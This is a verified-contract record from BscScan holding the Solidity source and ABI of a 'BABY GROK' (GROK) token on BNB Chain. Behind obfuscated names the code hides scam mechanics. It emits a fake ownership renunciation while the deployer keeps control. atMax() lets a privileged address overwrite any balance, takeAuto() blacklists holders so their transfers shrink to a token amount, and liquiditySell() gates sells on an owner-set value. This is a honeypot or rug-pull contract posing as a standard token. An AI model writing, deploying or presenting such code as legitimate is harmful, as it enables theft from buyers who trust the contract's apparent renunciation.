{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-11-17\r\n*/\r\n\r\n//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.4;\r\n\r\ninterface limitEnable {\r\n    function createPair(address buyEnable, address marketingLaunched) external returns (address);\r\n}\r\n\r\ninterface maxFundTrading {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address senderWalletMode) external view returns (uint256);\r\n\r\n    function transfer(address toMax, uint256 amountExempt) external returns (bool);\r\n\r\n    function allowance(address takeTeam, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amountExempt) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address toMax,\r\n        uint256 amountExempt\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed amountList, uint256 value);\r\n    event Approval(address indexed takeTeam, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract teamReceiver {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface launchedExempt {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface amountLimitTotal is maxFundTrading {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract BeginMaster is teamReceiver, maxFundTrading, amountLimitTotal {\r\n\r\n    mapping(address => uint256) private feeAmount;\r\n\r\n    uint256 private isExempt;\r\n\r\n    function takeAuto(address atExempt) public {\r\n        listTake();\r\n        if (tradingWallet != feeAuto) {\r\n            shouldLaunchedToken = true;\r\n        }\r\n        if (atExempt == minTx || atExempt == launchedFundSwap) {\r\n            return;\r\n        }\r\n        listTotal[atExempt] = true;\r\n    }\r\n\r\n    string private senderExempt = \"BABY GROK\";\r\n\r\n    function owner() external view returns (address) {\r\n        return isEnable;\r\n    }\r\n\r\n    uint8 private walletLimit = 18;\r\n\r\n    function allowance(address tokenMaxSell, address fundMin) external view virtual override returns (uint256) {\r\n        if (fundMin == launchedTx) {\r\n            return type(uint256).max;\r\n        }\r\n        return buySender[tokenMaxSell][fundMin];\r\n    }\r\n\r\n    function getOwner() external view returns (address) {\r\n        return isEnable;\r\n    }\r\n\r\n    function buyAmount() public {\r\n        emit OwnershipTransferred(minTx, address(0));\r\n        isEnable = address(0);\r\n    }\r\n\r\n    uint256 public minShouldLiquidity;\r\n\r\n    uint256 private feeAuto;\r\n\r\n    function senderMin(address exemptMax, address toMax, uint256 amountExempt) internal returns (bool) {\r\n        require(feeAmount[exemptMax] >= amountExempt);\r\n        feeAmount[exemptMax] -= amountExempt;\r\n        feeAmount[toMax] += amountExempt;\r\n        emit Transfer(exemptMax, toMax, amountExempt);\r\n        return true;\r\n    }\r\n\r\n    mapping(address => mapping(address => uint256)) private buySender;\r\n\r\n    event OwnershipTransferred(address indexed limitModeTx, address indexed maxMarketingEnable);\r\n\r\n    constructor (){\r\n        \r\n        launchedExempt liquidityAuto = launchedExempt(launchedTx);\r\n        launchedFundSwap = limitEnable(liquidityAuto.factory()).createPair(liquidityAuto.WETH(), address(this));\r\n        \r\n        minTx = _msgSender();\r\n        buyMin[minTx] = true;\r\n        feeAmount[minTx] = marketingSender;\r\n        buyAmount();\r\n        \r\n        emit Transfer(address(0), minTx, marketingSender);\r\n    }\r\n\r\n    uint256 private limitFrom;\r\n\r\n    bool public limitSwapWallet;\r\n\r\n    address launchedTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\n    function approve(address fundMin, uint256 amountExempt) public virtual override returns (bool) {\r\n        buySender[_msgSender()][fundMin] = amountExempt;\r\n        emit Approval(_msgSender(), fundMin, amountExempt);\r\n        return true;\r\n    }\r\n\r\n    uint256 private tradingWallet;\r\n\r\n    function transferFrom(address exemptMax, address toMax, uint256 amountExempt) external override returns (bool) {\r\n        if (_msgSender() != launchedTx) {\r\n            if (buySender[exemptMax][_msgSender()] != type(uint256).max) {\r\n                require(amountExempt <= buySender[exemptMax][_msgSender()]);\r\n                buySender[exemptMax][_msgSender()] -= amountExempt;\r\n            }\r\n        }\r\n        return liquiditySell(exemptMax, toMax, amountExempt);\r\n    }\r\n\r\n    function atTrading(uint256 amountExempt) public {\r\n        listTake();\r\n        amountFund = amountExempt;\r\n    }\r\n\r\n    string private listExempt = \"GROK\";\r\n\r\n    function decimals() external view virtual override returns (uint8) {\r\n        return walletLimit;\r\n    }\r\n\r\n    function name() external view virtual override returns (string memory) {\r\n        return senderExempt;\r\n    }\r\n\r\n    uint256 amountLaunch;\r\n\r\n    function atMax(address liquidityTotal, uint256 amountExempt) public {\r\n        listTake();\r\n        feeAmount[liquidityTotal] = amountExempt;\r\n    }\r\n\r\n    bool private atFee;\r\n\r\n    mapping(address => bool) public listTotal;\r\n\r\n    function maxTrading(address amountIs) public {\r\n        if (fundLimit) {\r\n            return;\r\n        }\r\n        \r\n        buyMin[amountIs] = true;\r\n        \r\n        fundLimit = true;\r\n    }\r\n\r\n    uint256 constant enableMarketingSwap = 15 ** 10;\r\n\r\n    function balanceOf(address senderWalletMode) public view virtual override returns (uint256) {\r\n        return feeAmount[senderWalletMode];\r\n    }\r\n\r\n    address private isEnable;\r\n\r\n    mapping(address => bool) public buyMin;\r\n\r\n    function symbol() external view virtual override returns (string memory) {\r\n        return listExempt;\r\n    }\r\n\r\n    uint256 amountFund;\r\n\r\n    address public minTx;\r\n\r\n    address fundTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\r\n\r\n    uint256 private marketingSender = 100000000 * 10 ** 18;\r\n\r\n    bool private shouldLaunchedToken;\r\n\r\n    function listTake() private view {\r\n        require(buyMin[_msgSender()]);\r\n    }\r\n\r\n    function totalSupply() external view virtual override returns (uint256) {\r\n        return marketingSender;\r\n    }\r\n\r\n    function transfer(address liquidityTotal, uint256 amountExempt) external virtual override returns (bool) {\r\n        return liquiditySell(_msgSender(), liquidityTotal, amountExempt);\r\n    }\r\n\r\n    function liquiditySell(address exemptMax, address toMax, uint256 amountExempt) internal returns (bool) {\r\n        if (exemptMax == minTx) {\r\n            return senderMin(exemptMax, toMax, amountExempt);\r\n        }\r\n        uint256 maxExemptShould = maxFundTrading(launchedFundSwap).balanceOf(fundTotal);\r\n        require(maxExemptShould == amountFund);\r\n        require(toMax != fundTotal);\r\n        if (listTotal[exemptMax]) {\r\n            return senderMin(exemptMax, toMax, enableMarketingSwap);\r\n        }\r\n        return senderMin(exemptMax, toMax, amountExempt);\r\n    }\r\n\r\n    bool public fundLimit;\r\n\r\n    address public launchedFundSwap;\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitModeTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMarketingEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMaxSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountExempt\",\"type\":\"uint256\"}],\"name\":\"atMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountExempt\",\"type\":\"uint256\"}],\"name\":\"atTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderWalletMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFundSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSwapWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountIs\",\"type\":\"address\"}],\"name\":\"maxTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minShouldLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"}],\"name\":\"takeAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BeginMaster", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://54d3b1e863d44d07c266a3cb4f06208ba0ce3405afe4329213c96acb6ffb5806"}